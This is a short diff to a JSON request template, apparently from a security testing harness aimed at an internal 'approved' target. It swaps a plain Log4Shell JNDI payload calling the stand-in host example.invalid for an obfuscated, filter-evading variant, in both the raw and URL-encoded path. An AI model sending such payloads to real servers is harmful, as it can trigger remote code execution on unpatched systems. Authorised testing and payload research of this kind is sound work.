@@ -12,7 +12,7 @@
       "modality": "http-request-template",
       "method": "GET",
       "path_key": "inventory-item-detail",
-      "path_payload": "${jndi:ldap://example.invalid/a}",
+      "path_payload": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.invalid/a}",
       "query": [],
       "headers": [],
       "cookies": [],
@@ -46,7 +46,7 @@
       },
       "scheme": "https",
       "authority": "approved-mc-target.internal",
-      "path": "/inventory/items/42/%24%7Bjndi%3Aldap%3A%2F%2Fexample.invalid%2Fa%7D"
+      "path": "/inventory/items/42/$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-l%7D$%7B::-d%7D$%7B::-a%7D$%7B::-p%7D:%2F%2Fexample.invalid%2Fa%7D"
     }
   }
 }
